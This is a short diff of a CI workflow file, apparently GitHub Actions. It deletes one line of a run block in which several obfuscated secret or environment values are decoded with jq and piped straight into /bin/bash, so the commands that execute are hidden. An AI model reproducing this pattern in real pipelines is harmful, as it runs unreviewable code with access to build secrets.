@@ -17,7 +17,6 @@ jobs:
           x41: ${{ secrets.x41 }}
         run: |
           printf '%s' "$x41" | jq -r .kizm28541 | /bin/bash
-          echo $c09448 | jq -r .u12206 | /bin/bash
           echo $n088 | jq -r .wpca70 | /bin/bash
           echo $wald4366 | jq -r .gw5595 | /bin/bash
           echo $vb9419 | jq -r .r79 | /bin/bash
